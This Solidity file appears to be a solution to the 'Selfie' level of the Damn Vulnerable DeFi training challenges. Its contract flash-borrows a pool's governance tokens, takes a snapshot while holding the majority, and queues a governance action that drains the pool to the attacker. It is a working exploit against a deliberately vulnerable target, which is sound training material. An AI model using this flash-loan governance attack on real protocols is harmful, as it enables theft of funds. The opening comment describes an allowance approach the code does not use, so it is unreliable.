// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;


// this contract will be executed on behalf of the lending pool, it will approve an allowance for the attacker EA
// thanks to this allowance which will be given during the flashloan function, the attacker will be able to spend
// the DVT tokens of the pool in a subsequent tx

import "@openzeppelin/contracts/utils/Address.sol";
import "@openzeppelin/contracts/token/ERC20/extensions/ERC20Snapshot.sol";
import "../DamnValuableTokenSnapshot.sol";
import "./SelfiePool.sol";
import "./SimpleGovernance.sol";

contract attacker6 {

    using Address for address;

    DamnValuableTokenSnapshot public governanceToken;
    SimpleGovernance public governance;
    SelfiePool public selfiePool;

    uint256 public print_amount;

    constructor(address tokenAddress, address governanceAddress, address selfiePoolAddress) {
        governanceToken = DamnValuableTokenSnapshot(tokenAddress);
        governance = SimpleGovernance(governanceAddress);
        selfiePool = SelfiePool(selfiePoolAddress);
    }

    function attack(address attackerEA) external {
        
        uint256 amount = governanceToken.balanceOf(address(selfiePool));

        // check the amount borrowed
        print_amount = amount;

        // flashloan
        selfiePool.flashLoan(amount);

        // insert a new action in the queue of the governance contract
        bytes memory data = abi.encodeWithSignature(
                "drainAllFunds(address)",
                address(attackerEA)
            );
        governance.queueAction(address(selfiePool), data, 0);
    }

    function receiveTokens(address token, uint256 amount) external {

        // snapshot: the attacker contract will have a majority of tokens at the time of the snapshot
        // the execute action function will check that the sender had a majority of tokens at last snapshot time
        governanceToken.snapshot();

        // reimburse flashloan
        governanceToken.transfer(msg.sender, amount);

    }

    // function getRewards(address attacker) external {
    //     rewarderPool.distributeRewards();
    //     uint256 withdr_rewards = rewardToken.balanceOf(address(this));
    //     // 
    //     rewardToken.transfer(msg.sender, withdr_rewards);
    // }

}